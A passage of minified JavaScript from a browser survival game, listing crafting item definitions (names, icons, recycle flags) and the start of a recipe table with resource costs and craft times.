      name: "Cooked meat",
      img: Ie.CRAFT_COOKED_MEAT,
      grid: 0,
      recycle: 0
    };
    ce[le.BIG_FIRE] = {
      name: "Big campfire",
      img: Ie.CRAFT_BIG_FIRE,
      grid: 0,
      recycle: 1
    };
    ce[le.BANDAGE] = {
      name: "Bandage",
      img: Ie.CRAFT_BANDAGE,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_WALL] = {
      name: "Stone wall",
      img: Ie.CRAFT_STONE_WALL,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_WALL] = {
      name: "Gold wall",
      img: Ie.CRAFT_GOLD_WALL,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_WALL] = {
      name: "Diamond wall",
      img: Ie.CRAFT_DIAMOND_WALL,
      grid: 0,
      recycle: 1
    };
    ce[le.WOOD_DOOR] = {
      name: "Wood door",
      img: Ie.CRAFT_DOOR_WOOD_CLOSE,
      grid: 0,
      recycle: 1
    };
    ce[le.CHEST] = {
      name: "Chest",
      img: Ie.CRAFT_CHEST,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_SPIKE] = {
      name: "Stone spike",
      img: Ie.CRAFT_STONE_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_SPIKE] = {
      name: "Gold spike",
      img: Ie.CRAFT_GOLD_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_SPIKE] = {
      name: "Diamond spike",
      img: Ie.CRAFT_DIAMOND_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_DOOR] = {
      name: "Stone door",
      img: Ie.CRAFT_DOOR_STONE_CLOSE,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_DOOR] = {
      name: "Gold door",
      img: Ie.CRAFT_DOOR_GOLD_CLOSE,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_DOOR] = {
      name: "Diamond door",
      img: Ie.CRAFT_DOOR_DIAMOND_CLOSE,
      grid: 0,
      recycle: 1
    };
    ce[le.EARMUFFS] = {
      name: "Chapka",
      img: Ie.CRAFT_EARMUFFS,
      grid: 0,
      recycle: 1
    };
    ce[le.COAT] = {
      name: "Big Chapka",
      img: Ie.CRAFT_COAT,
      grid: 0,
      recycle: 1
    };
    ce[le.WOOD_SPEAR] = {
      name: "Wood spear",
      img: Ie.CRAFT_WOOD_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.SPEAR] = {
      name: "Stone spear",
      img: Ie.CRAFT_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_SPEAR] = {
      name: "Gold spear",
      img: Ie.CRAFT_GOLD_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_SPEAR] = {
      name: "Diamond spear",
      img: Ie.CRAFT_DIAMOND_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.DRAGON_SPEAR] = {
      name: "Dragon spear",
      img: Ie.CRAFT_DRAGON_SPEAR,
      grid: 0,
      recycle: 0
    };
    ce[le.LAVA_SPEAR] = {
      name: "Dragon spear",
      img: Ie.CRAFT_LAVA_SPEAR,
      grid: 0,
      recycle: 0
    };
    ce[le.CRAB_SPEAR] = {
      name: "Crab spear",
      img: Ie.CRAFT_CRAB_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.CRAB_LOOT] = {
      name: "Crab loot",
      img: Ie.INV_CRAB_LOOT,
      grid: 0,
      recycle: 0
    };
    ce[le.FURNACE] = {
      name: "Furnace",
      img: Ie.CRAFT_FURNACE,
      grid: 0,
      recycle: 1
    };
    ce[le.EXPLORER_HAT] = {
      name: "Explorer hat",
      img: Ie.CRAFT_EXPLORER_HAT,
      grid: 0,
      recycle: 1
    };
    ce[le.PIRATE_HAT] = {
      name: "Pirate hat",
      img: Ie.CRAFT_PIRATE_HAT,
      grid: 0,
      recycle: 1
    };
    ce[le.FLOWER_HAT] = {
      name: "Flower hat",
      img: Ie.CRAFT_FLOWER_HAT,
      grid: 0,
      recycle: 1
    };
    ce[le.FUR_HAT] = {
      name: "Fur hat",
      img: Ie.CRAFT_FUR_HAT,
      grid: 0,
      recycle: 1
    };
    ce[le.WOOD_HELMET] = {
      name: "Wood helmet",
      img: Ie.CRAFT_WOOD_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_HELMET] = {
      name: "Stone helmet",
      img: Ie.CRAFT_STONE_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_HELMET] = {
      name: "Gold helmet",
      img: Ie.CRAFT_GOLD_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_HELMET] = {
      name: "Diamond helmet",
      img: Ie.CRAFT_DIAMOND_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.BOOK] = {
      name: "Book",
      img: Ie.CRAFT_BOOK,
      grid: 0,
      recycle: 1
    };
    ce[le.PAPER] = {
      name: "Paper",
      img: Ie.CRAFT_PAPER,
      grid: 0,
      recycle: 0
    };
    ce[le.BAG] = {
      name: "Bag",
      img: Ie.CRAFT_BAG,
      grid: 0,
      recycle: 1
    };
    ce[le.SWORD_AMETHYST] = {
      name: "Amethyst sword",
      img: Ie.CRAFT_SWORD_AMETHYST,
      grid: 0,
      recycle: 1
    };
    ce[le.PICK_AMETHYST] = {
      name: "Amethyst pick",
      img: Ie.CRAFT_PICK_AMETHYST,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_SPEAR] = {
      name: "Amethyst spear",
      img: Ie.CRAFT_AMETHYST_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.HAMMER] = {
      name: "Stone hammer",
      img: Ie.CRAFT_HAMMER,
      grid: 0,
      recycle: 1
    };
    ce[le.HAMMER_GOLD] = {
      name: "Gold hammer",
      img: Ie.CRAFT_HAMMER_GOLD,
      grid: 0,
      recycle: 1
    };
    ce[le.HAMMER_DIAMOND] = {
      name: "Diamond hammer",
      img: Ie.CRAFT_HAMMER_DIAMOND,
      grid: 0,
      recycle: 1
    };
    ce[le.HAMMER_AMETHYST] = {
      name: "Amethyst hammer",
      img: Ie.CRAFT_HAMMER_AMETHYST,
      grid: 0,
      recycle: 1
    };
    ce[le.HAMMER_REIDITE] = {
      name: "Reidite hammer",
      img: Ie.CRAFT_HAMMER_REIDITE,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_WALL] = {
      name: "Amethyst wall",
      img: Ie.CRAFT_AMETHYST_WALL,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_SPIKE] = {
      name: "Amethyst spike",
      img: Ie.CRAFT_AMETHYST_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_DOOR] = {
      name: "Amethyst door",
      img: Ie.CRAFT_DOOR_AMETHYST_CLOSE,
      grid: 0,
      recycle: 1
    };
    ce[le.CAP_SCARF] = {
      name: "Cap & scarf",
      img: Ie.CRAFT_CAP_SCARF,
      grid: 0,
      recycle: 1
    };
    ce[le.BLUE_CORD] = {
      name: "Blue cord",
      img: Ie.CRAFT_BLUE_CORD,
      grid: 0,
      recycle: 0
    };
    ce[le.LOCK] = {
      name: "Lock",
      img: Ie.CRAFT_LOCK,
      grid: 0,
      recycle: 1
    };
    ce[le.RESURRECTION] = {
      name: "Resurrection",
      img: Ie.CRAFT_RESURRECTION,
      grid: 0,
      recycle: 1
    };
    ce[le.LOCKPICK] = {
      name: "Lockpick",
      img: Ie.CRAFT_LOCKPICK,
      grid: 0,
      recycle: 1
    };
    ce[le.TOTEM] = {
      name: "Totem",
      img: Ie.CRAFT_TOTEM,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_HELMET] = {
      name: "Amethyst helmet",
      img: Ie.CRAFT_AMETHYST_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.SUPER_HAMMER] = {
      name: "Super hammer",
      img: Ie.CRAFT_SUPER_HAMMER,
      grid: 0,
      recycle: 1
    };
    ce[le.BRIDGE] = {
      name: "Bridge",
      img: Ie.CRAFT_BRIDGE,
      grid: 1,
      recycle: 1
    };
    ce[le.WOOD_TOWER] = {
      name: "Wood Tower",
      img: Ie.CRAFT_WOOD_TOWER,
      grid: 1,
      recycle: 1
    };
    ce[le.BOTTLE_FULL] = {
      name: "Bottle full",
      img: Ie.CRAFT_BOTTLE_FULL,
      grid: 0,
      recycle: 0
    };
    ce[le.BOTTLE_EMPTY] = {
      name: "Bottle empty",
      img: Ie.CRAFT_BOTTLE_EMPTY,
      grid: 0,
      recycle: 0
    };
    ce[le.SHOVEL] = {
      name: "Stone shovel",
      img: Ie.CRAFT_SHOVEL,
      grid: 0,
      recycle: 1
    };
    ce[le.WATERING_CAN] = {
      name: "Watering can",
      img: Ie.CRAFT_WATERING_CAN,
      grid: 0,
      recycle: 0
    };
    ce[le.WHEAT_SEED] = {
      name: "Wheat",
      img: Ie.CRAFT_WHEAT_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.COOKIE] = {
      name: "Cookie",
      img: Ie.CRAFT_COOKIE,
      grid: 0,
      recycle: 0
    };
    ce[le.WINDMILL] = {
      name: "Windmill",
      img: Ie.CRAFT_WINDMILL,
      grid: 0,
      recycle: 1
    };
    ce[le.SUPER_DIVING_SUIT] = {
      name: "Super diving suit",
      img: Ie.CRAFT_SUPER_DIVING_SUIT,
      grid: 0,
      recycle: 1
    };
    ce[le.DIVING_MASK] = {
      name: "Diving mask",
      img: Ie.CRAFT_DIVING_MASK,
      grid: 0,
      recycle: 1
    };
    ce[le.WATERING_CAN_FULL] = {
      name: "Watering can full",
      img: Ie.CRAFT_WATERING_CAN_FULL,
      grid: 0,
      recycle: 0
    };
    ce[le.CAKE] = {
      name: "Cake",
      img: Ie.CRAFT_CAKE,
      grid: 0,
      recycle: 0
    };
    ce[le.FOODFISH_COOKED] = {
      name: "Foodfish cooked",
      img: Ie.CRAFT_FOODFISH_COOKED,
      grid: 0,
      recycle: 0
    };
    ce[le.PLOT] = {
      name: "Plot",
      img: Ie.CRAFT_PLOT,
      grid: 1,
      recycle: 1
    };
    ce[le.BREAD] = {
      name: "Bread",
      img: Ie.CRAFT_BREAD,
      grid: 0,
      recycle: 0
    };
    ce[le.BOTTLE_FULL_2] = {
      name: "Bottle full (with ice)",
      img: Ie.CRAFT_BOTTLE_FULL_2,
      grid: 0,
      recycle: 1
    };
    ce[le.BOTTLE_FULL_3] = {
      name: "Bottle full (with well)",
      img: Ie.CRAFT_BOTTLE_FULL_3,
      grid: 0,
      recycle: 1
    };
    ce[le.SHOVEL_GOLD] = {
      name: "Gold shovel",
      img: Ie.CRAFT_SHOVEL_GOLD,
      grid: 0,
      recycle: 1
    };
    ce[le.SHOVEL_DIAMOND] = {
      name: "Diamond shovel",
      img: Ie.CRAFT_SHOVEL_DIAMOND,
      grid: 0,
      recycle: 1
    };
    ce[le.SHOVEL_AMETHYST] = {
      name: "Amethyst shovel",
      img: Ie.CRAFT_SHOVEL_AMETHYST,
      grid: 0,
      recycle: 1
    };
    ce[le.SPANNER] = {
      name: "Spanner",
      img: Ie.CRAFT_SPANNER,
      grid: 0,
      recycle: 1
    };
    ce[le.MACHETE] = {
      name: "Machete",
      img: Ie.CRAFT_MACHETE,
      grid: 0,
      recycle: 1
    };
    ce[le.BREAD_OVEN] = {
      name: "Bread oven",
      img: Ie.CRAFT_BREAD_OVEN,
      grid: 0,
      recycle: 1
    };
    ce[le.SANDWICH] = {
      name: "Sandwich",
      img: Ie.CRAFT_SANDWICH,
      grid: 0,
      recycle: 0
    };
    ce[le.DRAGON_HELMET] = {
      name: "Dragon helmet",
      img: Ie.CRAFT_DRAGON_HELMET,
      grid: 0,
      recycle: 0
    };
    ce[le.LAVA_HELMET] = {
      name: "Dragon helmet",
      img: Ie.CRAFT_LAVA_HELMET,
      grid: 0,
      recycle: 0
    };
    ce[le.WITCH] = {
      name: "Witch",
      img: Ie.CRAFT_WITCH,
      grid: 0,
      recycle: 0
    };
    ce[le.NIMBUS] = {
      name: "Nimbus",
      img: Ie.CRAFT_NIMBUS,
      grid: 0,
      recycle: 0
    };
    ce[le.WAND1] = {
      name: "Wand1",
      img: Ie.CRAFT_WAND1,
      grid: 0,
      recycle: 0
    };
    ce[le.WAND2] = {
      name: "Wand2",
      img: Ie.CRAFT_WAND2,
      grid: 0,
      recycle: 0
    };
    ce[le.DRAGON_SWORD] = {
      name: "Dragon sword",
      img: Ie.CRAFT_DRAGON_SWORD,
      grid: 0,
      recycle: 0
    };
    ce[le.LAVA_SWORD] = {
      name: "Dragon sword",
      img: Ie.CRAFT_LAVA_SWORD,
      grid: 0,
      recycle: 0
    };
    ce[le.WOOD_SHIELD] = {
      name: "Wood shield",
      img: Ie.CRAFT_WOOD_SHIELD,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_SHIELD] = {
      name: "Stone shield",
      img: Ie.CRAFT_STONE_SHIELD,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_SHIELD] = {
      name: "Gold shield",
      img: Ie.CRAFT_GOLD_SHIELD,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_SHIELD] = {
      name: "Diamond shield",
      img: Ie.CRAFT_DIAMOND_SHIELD,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_SHIELD] = {
      name: "Amethyst shield",
      img: Ie.CRAFT_AMETHYST_SHIELD,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_SHIELD] = {
      name: "Reidite shield",
      img: Ie.CRAFT_REIDITE_SHIELD,
      grid: 0,
      recycle: 1
    };
    ce[le.WOOD_BOW] = {
      name: "Wood bow",
      img: Ie.CRAFT_WOOD_BOW,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_BOW] = {
      name: "Stone bow",
      img: Ie.CRAFT_STONE_BOW,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_BOW] = {
      name: "Gold bow",
      img: Ie.CRAFT_GOLD_BOW,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_BOW] = {
      name: "Diamond bow",
      img: Ie.CRAFT_DIAMOND_BOW,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_BOW] = {
      name: "Amethyst bow",
      img: Ie.CRAFT_AMETHYST_BOW,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_BOW] = {
      name: "Reidite bow",
      img: Ie.CRAFT_REIDITE_BOW,
      grid: 0,
      recycle: 1
    };
    ce[le.DRAGON_BOW] = {
      name: "Dragon bow",
      img: Ie.CRAFT_DRAGON_BOW,
      grid: 0,
      recycle: 0
    };
    ce[le.CROWN_GREEN] = {
      name: "Crown of life",
      img: Ie.CRAFT_CROWN_GREEN,
      grid: 0,
      recycle: 0
    };
    ce[le.GEMME_GREEN] = {
      name: "Gem of life",
      img: Ie.INV_GEMME_GREEN,
      grid: 0,
      recycle: 0
    };
    ce[le.DRAGON_ORB] = {
      name: "Orb of the dragon",
      img: Ie.INV_DRAGON_ORB,
      grid: 0,
      recycle: 0
    };
    ce[le.LAVA_ORB] = {
      name: "Orb of the dragon",
      img: Ie.INV_LAVA_ORB,
      grid: 0,
      recycle: 0
    };
    ce[le.DRAGON_CUBE] = {
      name: "Cube of the dragon",
      img: Ie.INV_DRAGON_CUBE,
      grid: 0,
      recycle: 0
    };
    ce[le.LAVA_CUBE] = {
      name: "Cube of the dragon",
      img: Ie.INV_LAVA_CUBE,
      grid: 0,
      recycle: 0
    };
    ce[le.CROWN_ORANGE] = {
      name: "Crown of luck",
      img: Ie.CRAFT_CROWN_ORANGE,
      grid: 0,
      recycle: 0
    };
    ce[le.GEMME_ORANGE] = {
      name: "Gem of luck",
      img: Ie.INV_GEMME_ORANGE,
      grid: 0,
      recycle: 0
    };
    ce[le.CROWN_BLUE] = {
      name: "Crown of the angel",
      img: Ie.CRAFT_CROWN_BLUE,
      grid: 0,
      recycle: 0
    };
    ce[le.GEMME_BLUE] = {
      name: "Gem of the angel",
      img: Ie.INV_GEMME_BLUE,
      grid: 0,
      recycle: 0
    };
    ce[le.DRAGON_HEART] = {
      name: "Dragon heart",
      img: Ie.INV_DRAGON_HEART,
      grid: 0,
      recycle: 0
    };
    ce[le.LAVA_HEART] = {
      name: "Lava heart",
      img: Ie.INV_LAVA_HEART,
      grid: 0,
      recycle: 0
    };
    ce[le.HOOD] = {
      name: "Hood",
      img: Ie.CRAFT_HOOD,
      grid: 0,
      recycle: 1
    };
    ce[le.PEASANT] = {
      name: "Peasant",
      img: Ie.CRAFT_PEASANT,
      grid: 0,
      recycle: 1
    };
    ce[le.WINTER_PEASANT] = {
      name: "Winter peasant",
      img: Ie.CRAFT_WINTER_PEASANT,
      grid: 0,
      recycle: 0
    };
    ce[le.WINTER_HOOD] = {
      name: "Winter hood",
      img: Ie.CRAFT_WINTER_HOOD,
      grid: 0,
      recycle: 0
    };
    ce[le.BUCKET_FULL] = {
      name: "Bucket full",
      img: Ie.CRAFT_BUCKET_FULL,
      grid: 0,
      recycle: 0
    };
    ce[le.BUCKET_EMPTY] = {
      name: "Bucket empty",
      img: Ie.CRAFT_BUCKET_EMPTY,
      grid: 0,
      recycle: 1
    };
    ce[le.WELL] = {
      name: "Well",
      img: Ie.CRAFT_WELL,
      grid: 0,
      recycle: 1
    };
    ce[le.SIGN] = {
      name: "Sign",
      img: Ie.CRAFT_SIGN,
      grid: 0,
      recycle: 1
    };
    ce[le.PUMPKIN_SEED] = {
      name: "Pumpkin Seed",
      img: Ie.CRAFT_PUMPKIN_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.GARLIC_SEED] = {
      name: "Garlic Seed",
      img: Ie.CRAFT_GARLIC_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.THORNBUSH_SEED] = {
      name: "Thorbushes Seed",
      img: Ie.CRAFT_THORNBUSH_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.ROOF] = {
      name: "Roof",
      img: Ie.CRAFT_ROOF,
      grid: 1,
      recycle: 1
    };
    ce[le.CROWN_CRAB] = {
      name: "Crab Crown",
      img: Ie.CRAFT_CROWN_CRAB,
      grid: 0,
      recycle: 1
    };
    ce[le.CARROT_SEED] = {
      name: "Carrot Seed",
      img: Ie.CRAFT_CARROT_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.TOMATO_SEED] = {
      name: "Tomato Seed",
      img: Ie.CRAFT_TOMATO_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.WATERMELON_SEED] = {
      name: "Watermelon Seed",
      img: Ie.CRAFT_WATERMELON_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.ALOE_VERA_SEED] = {
      name: "Aloe Vera Seed",
      img: Ie.CRAFT_ALOE_VERA_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.TURBAN1] = {
      name: "Cap",
      img: Ie.CRAFT_TURBAN1,
      grid: 0,
      recycle: 1
    };
    ce[le.TURBAN2] = {
      name: "Turban",
      img: Ie.CRAFT_TURBAN2,
      grid: 0,
      recycle: 1
    };
    ce[le.PILOT_HELMET] = {
      name: "Pilot Helmet",
      img: Ie.CRAFT_PILOT_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.EMERALD_MACHINE] = {
      name: "Emerald Machine",
      img: Ie.CRAFT_EMERALD_MACHINE,
      grid: 0,
      recycle: 0
    };
    ce[le.EXTRACTOR_MACHINE_STONE] = {
      name: "Emerald Machine",
      img: Ie.CRAFT_EXTRACTOR_MACHINE_STONE,
      grid: 0,
      recycle: 1
    };
    ce[le.EXTRACTOR_MACHINE_GOLD] = {
      name: "Emerald Machine",
      img: Ie.CRAFT_EXTRACTOR_MACHINE_GOLD,
      grid: 0,
      recycle: 1
    };
    ce[le.EXTRACTOR_MACHINE_DIAMOND] = {
      name: "Emerald Machine",
      img: Ie.CRAFT_EXTRACTOR_MACHINE_DIAMOND,
      grid: 0,
      recycle: 1
    };
    ce[le.EXTRACTOR_MACHINE_AMETHYST] = {
      name: "Emerald Machine",
      img: Ie.CRAFT_EXTRACTOR_MACHINE_AMETHYST,
      grid: 0,
      recycle: 1
    };
    ce[le.EXTRACTOR_MACHINE_REIDITE] = {
      name: "Emerald Machine",
      img: Ie.CRAFT_EXTRACTOR_MACHINE_REIDITE,
      grid: 0,
      recycle: 1
    };
    ce[le.PITCHFORK] = {
      name: "Pitchfork",
      img: Ie.CRAFT_PITCHFORK,
      grid: 0,
      recycle: 1
    };
    ce[le.WOOD_DOOR_SPIKE] = {
      name: "Wood Door Spike",
      img: Ie.CRAFT_WOOD_DOOR_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_DOOR_SPIKE] = {
      name: "Stone Door Spike",
      img: Ie.CRAFT_STONE_DOOR_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_DOOR_SPIKE] = {
      name: "Gold Door Spike",
      img: Ie.CRAFT_GOLD_DOOR_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_DOOR_SPIKE] = {
      name: "Diamond Door Spike",
      img: Ie.CRAFT_DIAMOND_DOOR_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_DOOR_SPIKE] = {
      name: "Amethyst Door Spike",
      img: Ie.CRAFT_AMETHYST_DOOR_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_PROTECTION] = {
      name: "Diamond Fire Protection ",
      img: Ie.CRAFT_DIAMOND_PROTECTION,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_PROTECTION] = {
      name: "Amethyst Fire Protection ",
      img: Ie.CRAFT_AMETHYST_PROTECTION,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_PROTECTION] = {
      name: "Amethyst Fire Protection ",
      img: Ie.CRAFT_REIDITE_PROTECTION,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_SWORD] = {
      name: "Reidite Sword",
      img: Ie.CRAFT_REIDITE_SWORD,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_SPEAR] = {
      name: "Reidite Spear",
      img: Ie.CRAFT_REIDITE_SPEAR,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_HELMET] = {
      name: "Reidite Helmet",
      img: Ie.CRAFT_REIDITE_HELMET,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_DOOR_SPIKE] = {
      name: "Reidite Door Spike",
      img: Ie.CRAFT_REIDITE_DOOR_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_DOOR] = {
      name: "Reidite Door",
      img: Ie.CRAFT_REIDITE_DOOR,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_SPIKE] = {
      name: "Reidite Spike",
      img: Ie.CRAFT_REIDITE_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_WALL] = {
      name: "Reidite Wall",
      img: Ie.CRAFT_REIDITE_WALL,
      grid: 0,
      recycle: 1
    };
    ce[le.PICK_REIDITE] = {
      name: "Reidite pick",
      img: Ie.CRAFT_PICK_REIDITE,
      grid: 0,
      recycle: 1
    };
    ce[le.BOAT] = {
      name: "Boat",
      img: Ie.CRAFT_BOAT,
      grid: 0,
      recycle: 1
    };
    ce[le.SLED] = {
      name: "Sled",
      img: Ie.CRAFT_SLED,
      grid: 0,
      recycle: 1
    };
    ce[le.SADDLE] = {
      name: "Saddle",
      img: Ie.CRAFT_SADDLE,
      grid: 0,
      recycle: 1
    };
    ce[le.MOUNT_BOAR] = {
      name: "Mount Boar",
      img: Ie.CRAFT_MOUNT_BOAR,
      grid: 0,
      recycle: 0
    };
    ce[le.CRAB_BOSS] = {
      name: "Mount King Crab",
      img: Ie.CRAFT_CRAB_BOSS,
      grid: 0,
      recycle: 0
    };
    ce[le.BABY_DRAGON] = {
      name: "Mount Baby Dragon",
      img: Ie.CRAFT_BABY_DRAGON,
      grid: 0,
      recycle: 0
    };
    ce[le.BABY_LAVA] = {
      name: "Mount Baby Lava",
      img: Ie.CRAFT_BABY_LAVA,
      grid: 0,
      recycle: 0
    };
    ce[le.HAWK] = {
      name: "Mount Hawk",
      img: Ie.CRAFT_HAWK,
      grid: 0,
      recycle: 0
    };
    ce[le.PLANE] = {
      name: "Plane",
      img: Ie.CRAFT_PLANE,
      grid: 0,
      recycle: 0
    };
    ce[le.PITCHFORK2] = {
      name: "Pitchfork 2",
      img: Ie.CRAFT_PITCHFORK2,
      grid: 0,
      recycle: 0
    };
    ce[le.BABY_MAMMOTH] = {
      name: "Baby Mammoth",
      img: Ie.CRAFT_BABY_MAMMOTH,
      grid: 0,
      recycle: 0
    };
    var Re = undefined;
    var ge = [{
      r: [[le.WOOD, 25], [le.STONE, 5]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.FIRE,
      id2: le.FIRE,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.FIRE, 1], [le.WOOD, 35], [le.STONE, 10]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BIG_FIRE,
      id2: le.BIG_FIRE,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 150], [le.STONE, 50], [le.GOLD, 15]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.FURNACE,
      id2: le.FURNACE,
      time: 0.05,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 20], [le.STONE, 10]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WORKBENCH,
      id2: le.WORKBENCH,
      time: 1 / 6,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 10]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PICK_WOOD,
      id2: le.PICK_WOOD,
      time: 1 / 3,
      t: Oe.TOOLS
    }, {
      r: [[le.PICK_WOOD, 1], [le.WOOD, 50], [le.STONE, 15]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PICK,
      id2: le.PICK,
      time: 1 / 8,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 40], [le.GOLD, 20], [le.STONE, 30], [le.PICK, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PICK_GOLD,
      id2: le.PICK_GOLD,
      time: 1 / 12,
      t: Oe.TOOLS
    }, {
      r: [[le.DIAMOND, 20], [le.GOLD, 50], [le.STONE, 80], [le.PICK_GOLD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PICK_DIAMOND,
      id2: le.PICK_DIAMOND,
      time: 0.05,
      t: Oe.TOOLS
    }, {
      r: [[le.DIAMOND, 40], [le.GOLD, 60], [le.AMETHYST, 30], [le.PICK_DIAMOND, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PICK_AMETHYST,
      id2: le.PICK_AMETHYST,
      time: 1 / 60,
      t: Oe.TOOLS
    }, {
      r: [[le.AMETHYST, 30], [le.DIAMOND, 40], [le.REIDITE, 30], [le.PICK_AMETHYST, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PICK_REIDITE,
      id2: le.PICK_REIDITE,
      time: 1 / 90,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 90], [le.STONE, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.HAMMER,
      id2: le.HAMMER,
      time: 0.1,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 160], [le.STONE, 120], [le.GOLD, 80], [le.HAMMER, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.HAMMER_GOLD,
      id2: le.HAMMER_GOLD,
      time: 1 / 15,
      t: Oe.TOOLS
    }, {
      r: [[le.DIAMOND, 80], [le.STONE, 200], [le.GOLD, 150], [le.HAMMER_GOLD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.HAMMER_DIAMOND,
      id2: le.HAMMER_DIAMOND,
      time: 0.05,
      t: Oe.TOOLS
    }, {
      r: [[le.DIAMOND, 160], [le.AMETHYST, 60], [le.GOLD, 250], [le.HAMMER_DIAMOND, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.HAMMER_AMETHYST,
      id2: le.HAMMER_AMETHYST,
      time: 1 / 60,
      t: Oe.TOOLS
    }, {
      r: [[le.AMETHYST, 160], [le.REIDITE, 60], [le.DIAMOND, 250], [le.HAMMER_AMETHYST, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.HAMMER_REIDITE,
      id2: le.HAMMER_REIDITE,
      time: 1 / 90,
      t: Oe.TOOLS
    }, {
      r: [[le.HAMMER_REIDITE, 1], [le.BOTTLE_FULL, 1], [le.KRAKEN_SKIN, 1], [le.SCALES, 10], [le.AMETHYST, 20]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.SUPER_HAMMER,
      id2: le.SUPER_HAMMER,
      time: 1 / 120,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 30], [le.STONE, 15]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SHOVEL,
      id2: le.SHOVEL,
      time: 0.2,
      t: Oe.TOOLS
    }, {
      r: [[le.SHOVEL, 1], [le.GOLD, 20], [le.STONE, 30], [le.WOOD, 40]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SHOVEL_GOLD,
      id2: le.SHOVEL_GOLD,
      time: 0.1,
      t: Oe.TOOLS
    }, {
      r: [[le.SHOVEL_GOLD, 1], [le.DIAMOND, 20], [le.GOLD, 50], [le.STONE, 80]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SHOVEL_DIAMOND,
      id2: le.SHOVEL_DIAMOND,
      time: 0.05,
      t: Oe.TOOLS
    }, {
